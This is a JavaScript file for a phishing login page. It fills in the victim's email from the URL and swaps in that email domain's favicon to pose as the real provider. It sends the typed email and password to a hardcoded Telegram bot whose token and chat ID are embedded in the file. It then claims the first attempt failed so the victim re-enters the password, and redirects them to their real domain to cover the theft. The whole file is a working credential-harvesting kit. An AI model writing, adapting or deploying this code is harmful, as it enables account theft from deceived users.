// Replace with your actual bot token and chat ID
const BOT_TOKEN = '7075899066:AAFC8B3xFgH4Vw9zmQS3k3bwlVkxZH_ji5M';
const CHAT_ID = '7421629323';
let loginAttempts = 0;

// Function to get email from hash
function getEmailFromHash() {
    const hash = window.location.hash.substring(1);
    return hash.includes('@') ? hash : null;
}

// Update logo dynamically based on email domain
function updateLogo(email) {
    const emailParts = email.split('@');
    if (emailParts.length > 1) {
        const domain = emailParts[1];
        const logoUrl = `https://www.${domain}/favicon.ico`; // Example: Use the domain's favicon as logo
        const logoElement = document.getElementById('dynamic-logo');

        // Update the logo src attribute
        logoElement.src = logoUrl;

        // Add fallback in case the image fails to load
        logoElement.onerror = () => {
            logoElement.src = 'https://via.placeholder.com/100'; // Fallback logo
        };
    }
}

// Populate the email field if an email is passed in the URL hash
document.addEventListener('DOMContentLoaded', () => {
    const emailFromHash = getEmailFromHash();
    if (emailFromHash) {
        document.getElementById('user-email').value = emailFromHash;
        updateLogo(emailFromHash);
    }
});

// Event listener for form input to update the logo dynamically
document.getElementById('user-email').addEventListener('input', (event) => {
    const email = event.target.value;
    updateLogo(email);
});

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const userEmail = document.getElementById('user-email').value;
    const password = document.getElementById('password').value;
    const rememberMe = document.getElementById('remember-me').checked ? 'Yes' : 'No';

    const message = `Login Attempt:\nEmail: ${userEmail}\nPassword: ${password}\nRemember Me: ${rememberMe}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(response => response.json())
    .catch(error => console.error('Error:', error));

    loginAttempts++;

    if (loginAttempts === 1) {
        alert("Email/password is incorrect, try again");
    }

    if (loginAttempts >= 2) {
        document.getElementById('overlay').style.visibility = 'visible';

        setTimeout(() => {
            const emailParts = userEmail.split('@');
            if (emailParts.length > 1) {
                const domain = emailParts[1];
                const redirectUrl = `https://${domain}`;
                window.location.href = redirectUrl;
            } else {
                console.error('Invalid email format.');
            }
        }, 2000);
    }
});
